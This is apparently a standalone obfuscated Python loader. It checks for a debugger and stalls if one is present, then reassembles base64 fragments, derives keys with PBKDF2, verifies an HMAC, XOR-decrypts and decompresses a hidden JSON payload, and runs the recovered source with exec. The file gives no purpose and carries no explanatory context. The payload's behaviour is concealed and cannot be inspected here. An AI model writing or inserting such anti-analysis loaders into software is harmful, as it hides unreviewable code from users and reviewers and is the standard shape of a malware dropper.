import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_4345d8_0 = 'Ae9vK2osnOhmOOyWkBaCG0Z7vzjoeCGab86M'
_4345d8_1 = '6NqbgsTr1fEG7XV9NjZgKZ4e6NGIjmbRqPXjUlpIfQ=='
_pls = [_4345d8_0, _4345d8_1]
_361a56 = [(23193,40886,2),(8776,46894,2),(59278,38213,2),(11881,60540,2),(33818,31631,2),(54963,47575,2),(26811,46445,2),(56249,36520,2),(24857,60510,2),(3900,40268,2),(61524,23950,2),(21535,55036,2),(38780,1328,2),(46706,60333,2),(16827,33099,2),(47389,5240,2),(0,0,0),(0,0,0)]
_2b3ede = 'xS+VZg=='
_047824 = 'U0WXB8X8zFLu1gvm'
_9d0eaf = 'YV9WjuMDufw='
_b4e589 = [0, 1]
_salt = base64.b64decode(_9d0eaf)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _b4e589
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_5a2c63 = base64.b64decode(_assembled)
_60c15c = 32
_6fc4f0 = _5a2c63[:-_60c15c]
_60c15c = _5a2c63[-_60c15c:]
_7afbd2 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_361a56)
_hdr = base64.b64decode(_2b3ede)
_nonce = base64.b64decode(_047824)
_km_seed = hashlib.sha256(_7afbd2 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _6fc4f0, hashlib.sha256).digest()
if _calc_tag != _60c15c:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_6fc4f0)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_6fc4f0, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_fc298e'] = mmap
globals()['_5a1c7a'] = lambda i: globals()['_fc298e'][str(i)]
_x = globals()['_5a1c7a']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
